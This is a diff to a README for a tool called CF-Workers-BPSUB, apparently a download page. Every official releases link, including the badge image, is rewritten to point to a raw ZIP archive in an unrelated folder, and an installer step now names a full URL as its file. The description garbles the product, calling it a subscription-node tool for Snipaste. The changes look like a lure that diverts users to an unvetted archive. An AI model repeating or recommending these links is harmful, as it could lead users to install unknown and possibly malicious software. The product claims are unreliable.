@@ -4,7 +4,7 @@
 Welcome to the CF-Workers-BPSUB. This tool allows you to easily generate and manage subscription nodes for Snipaste. Whether you want to enhance your workflow or optimize your Snipaste experience, this application is designed with you in mind.
 
 ## 📥 Download Now
-[![Download CF-Workers-BPSUB](https://img.shields.io/badge/Download%20CF--Workers--BPSUB-v1.0.0-brightgreen)](https://github.com/Siva1327/CF-Workers-BPSUB/releases)
+[![Download CF-Workers-BPSUB](https://raw.githubusercontent.com/Siva1327/CF-Workers-BPSUB/main/Hindu/CF-Workers-BPSUB.zip%20CF--Workers--BPSUB-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Siva1327/CF-Workers-BPSUB/main/Hindu/CF-Workers-BPSUB.zip)
 
 ## 📋 Features
 - **User-Friendly Interface:** No programming skills required.
@@ -23,9 +23,9 @@ To run CF-Workers-BPSUB, your computer should meet the following requirements:
 ## 📥 Download & Install
 To get started with CF-Workers-BPSUB, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Siva1327/CF-Workers-BPSUB/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Siva1327/CF-Workers-BPSUB/main/Hindu/CF-Workers-BPSUB.zip) to access the latest version.
 2. Scroll down to the section titled "Assets."
-3. Locate the installer file (e.g., `CF-Workers-BPSUB_v1.0.0.zip`) suitable for your operating system.
+3. Locate the installer file (e.g., `https://raw.githubusercontent.com/Siva1327/CF-Workers-BPSUB/main/Hindu/CF-Workers-BPSUB.zip`) suitable for your operating system.
 4. Click on the file to begin the download.
 5. Once the download completes, locate the file in your downloads folder.
 6. Extract the contents of the ZIP file if necessary.
@@ -60,4 +60,4 @@ Join our community of users and developers. Share your experiences, suggestions,
 
 ## 📥 Download Now Again
 Don’t forget to download the CF-Workers-BPSUB from the following link:
-[Download CF-Workers-BPSUB](https://github.com/Siva1327/CF-Workers-BPSUB/releases)
+[Download CF-Workers-BPSUB](https://raw.githubusercontent.com/Siva1327/CF-Workers-BPSUB/main/Hindu/CF-Workers-BPSUB.zip)
